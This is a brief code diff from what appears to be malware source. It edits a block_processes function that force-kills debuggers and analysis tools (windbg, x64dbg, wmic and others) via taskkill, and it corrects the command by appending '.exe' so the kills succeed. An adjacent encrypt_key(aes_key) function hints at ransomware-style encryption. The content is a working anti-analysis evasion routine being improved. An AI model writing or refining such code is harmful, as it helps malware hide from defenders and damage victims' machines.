@@ -354,7 +354,7 @@ def block_processes():
         "windasm", "windbg", "wmic", "x32dbg", "x64dbg",
     ]
     for proc in blocked_processes:
-        execute_command(f'taskkill /f /im "{proc}" /t')
+        execute_command(f'taskkill /f /im "{proc + ".exe"}" /t')
 
 
 def encrypt_key(aes_key):
